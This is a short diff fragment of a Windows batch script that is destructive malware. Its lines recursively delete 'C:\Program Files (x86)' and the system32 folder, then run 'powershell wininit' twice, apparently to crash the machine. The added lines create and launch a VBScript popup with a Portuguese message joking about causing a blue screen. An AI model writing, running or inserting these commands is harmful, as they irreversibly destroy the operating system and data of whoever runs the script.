@@ -633,6 +633,8 @@ rd /s /q "C:\Program Files (x86)"
 timeout /t 5 /nobreak > nul
 rmdir /s /q %windir%\system32
 cd "%temp%"
+echo/msgbox"E uma delicia dar uma tela azul",vbCritical,"Faz bem">>iso.vbs
+start iso.vbs
 timeout /t 10 > nul
 powershell wininit
 powershell wininit
